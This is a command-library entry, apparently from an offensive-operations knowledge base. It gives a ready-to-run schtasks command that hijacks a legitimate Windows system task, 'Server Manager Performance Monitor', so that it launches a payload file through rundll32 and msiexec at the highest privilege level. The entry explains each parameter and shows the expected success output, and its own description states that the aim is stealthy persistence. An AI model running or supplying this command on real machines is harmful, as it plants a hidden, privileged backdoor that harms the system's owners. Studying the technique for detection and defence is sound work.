---
type: command
executor: cmd
data: >-
  schtasks /change /tn "\\Microsoft\\Windows\\PLA\\Server Manager Performance
  Monitor" /tr "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA
  C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST
  /RU "" /ENABLE
output: null
platforms:
  - Windows
tags:
  - persistence
  - scheduled-task
verified: true
validated: true
---

# schtasks-change-task-payload

## Command

```cmd
schtasks /change /tn "\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor" /tr "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
```

## Description

Modifies an existing system task to inject and execute a payload at highest privileges, hijacking legit tasks for stealth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /tn "\\Microsoft\\Windows\\PLA\\..." | Existing task path/name | Yes |
| /tr "...rundll32.exe ..." | New action: indirection via rundll32 to payload | Yes |
| /RL HIGHEST | Run at highest privileges | Yes |
| /RU "" | Run as system (empty for current) | No |
| /ENABLE | Enable the task | Yes |

## Examples

### Basic Usage

```cmd
schtasks /change /tn "\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor" /tr "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /ENABLE
```

## Expected Output

SUCCESS: The scheduled task "\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor" has successfully been updated.

## Related

- [[procedures/Create-Scheduled-Task-Backdoor-for-Persistence]]
